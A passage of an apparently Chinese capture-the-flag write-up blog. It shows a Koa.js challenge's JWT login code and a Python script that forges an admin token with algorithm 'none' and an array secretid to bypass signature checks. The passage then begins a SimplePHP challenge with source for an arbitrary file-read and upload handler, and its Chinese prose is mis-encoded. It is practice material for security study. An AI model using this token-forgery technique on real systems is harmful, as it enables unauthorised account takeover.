</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="p">{</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">}</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">username</span> <span class="o">||</span> <span class="nx">username</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">APIError</span><span class="p">(</span><span class="s1">&#39;register error&#39;</span><span class="p">,</span> <span class="s1">&#39;wrong username&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">100000</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">secret</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">18</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">secretid</span> <span class="o">=</span> <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span><span class="nx">secretid</span><span class="p">,</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">},</span> <span class="nx">secret</span><span class="p">,</span> <span class="p">{</span><span class="nx">algorithm</span><span class="o">:</span> <span class="s1">&#39;HS256&#39;</span><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">rest</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">token</span><span class="o">:</span> <span class="nx">token</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">next</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;POST /api/login&#39;</span><span class="o">:</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="p">{</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">}</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">username</span> <span class="o">||</span> <span class="o">!</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">APIError</span><span class="p">(</span><span class="s1">&#39;login error&#39;</span><span class="p">,</span> <span class="s1">&#39;username or password is necessary&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">authorization</span> <span class="o">||</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">authorization</span> <span class="o">||</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">authorization</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">sid</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;base64&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()).</span><span class="nx">secretid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">sid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">sid</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">sid</span> <span class="o">===</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="nx">sid</span> <span class="o">&lt;</span> <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">sid</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">APIError</span><span class="p">(</span><span class="s1">&#39;login error&#39;</span><span class="p">,</span> <span class="s1">&#39;no such secret id&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">secret</span> <span class="o">=</span> <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">[</span><span class="nx">sid</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">secret</span><span class="p">,</span> <span class="p">{</span><span class="nx">algorithm</span><span class="o">:</span> <span class="s1">&#39;HS256&#39;</span><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">status</span> <span class="o">=</span> <span class="nx">username</span> <span class="o">===</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">===</span> <span class="nx">user</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">ctx</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="nx">username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">rest</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">status</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">next</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;GET /api/flag&#39;</span><span class="o">:</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">!==</span> <span class="s1">&#39;admin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">APIError</span><span class="p">(</span><span class="s1">&#39;permission error&#39;</span><span class="p">,</span> <span class="s1">&#39;permission denied&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">rest</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">flag</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">next</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;GET /api/logout&#39;</span><span class="o">:</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">rest</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">status</span><span class="o">:</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">next</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>jwtæ— ç­¾å</p>
<p>ä¸ä»…ç­¾åè¦æ”¹ä¸ºnoneï¼Œsecretidè¦æ”¹ä¸º[]ï¼Œç„¶åæŠŠusernameæ”¹ä¸ºadmin</p>
<p>è¿™é‡Œè½½çš„æ˜¯PyJWTåŒ…ï¼Œç”¨pythonæ¥ä¼ªé€ </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jwt</span>
</span></span><span class="line"><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;secretid&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;123456&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;iat&#34;</span><span class="p">:</span> <span class="mi">1742471740</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="n">algorithm</span><span class="o">=</span><span class="s2">&#34;none&#34;</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>bpä¿®æ”¹æ”¾åŒ…ç„¶åè®¿é—®/api/flag</p>
<h2 id="swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP
</h2><p>æŸ¥çœ‹æºç </p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250320204558124.png"
	width="1190"
	height="325"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250320204558124_hu11887701612488520385.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250320204558124_hu12881395714476106575.png 1024w"
	loading="lazy"
	
		alt="image-20250320204558124"
	
	
		class="gallery-image" 
		data-flex-grow="366"
		data-flex-basis="878px"
	
></p>
<p>æŸ¥çœ‹æ–‡ä»¶è¿™é‡Œæœ‰ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>index.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;content-type:text/html;charset=utf-8&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;base.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>base.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">session_start</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!DOCTYPE html&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;meta charset=&#34;utf-8&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;title&gt;web3&lt;/title&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;script src=&#34;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&#34;&gt;&lt;/script&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;script src=&#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&#34;&gt;&lt;/script&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;nav class=&#34;navbar navbar-default&#34; role=&#34;navigation&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;div class=&#34;container-fluid&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;div class=&#34;navbar-header&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;a class=&#34;navbar-brand&#34; href=&#34;index.php&#34;&gt;é¦–é¡µ&lt;/a&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;/div&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;ul class=&#34;nav navbar-nav navbra-toggle&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li class=&#34;active&#34;&gt;&lt;a href=&#34;file.php?file=&#34;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li&gt;&lt;a href=&#34;upload_file.php&#34;&gt;ä¸Šä¼ æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;/ul&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;ul class=&#34;nav navbar-nav navbar-right&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li&gt;&lt;a href=&#34;index.php&#34;&gt;&lt;span class=&#34;glyphicon glyphicon-user&#34;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;/ul&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;/div&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/nav&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!--flag is in f1ag.php--&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>file.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;content-type:text/html;charset=utf-8&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;function.php&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;class.php&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/var/www/html/&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$show</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">_show</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span> 
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;file doesn\&#39;t exists.&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>function.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="c1">//show_source(__FILE__); 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">include</span> <span class="s2">&#34;base.php&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-type: text/html;charset=utf-8&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file_do</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;.jpg&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="c1">//mkdir(&#34;upload&#34;,0777); 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span><span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;ä¸Šä¼ æˆåŠŸ!&#34;);&lt;/script&gt;&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">upload_file_check</span><span class="p">())</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">upload_file_do</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file_check</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$allowed_types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;gif&#34;</span><span class="p">,</span><span class="s2">&#34;jpeg&#34;</span><span class="p">,</span><span class="s2">&#34;jpg&#34;</span><span class="p">,</span><span class="s2">&#34;png&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$temp</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$extension</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#34;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&#34; . &#34;&lt;h4/&gt;&#34;; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$extension</span><span class="p">,</span><span class="nv">$allowed_types</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;Invalid file!&#34;);&lt;/script&gt;&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
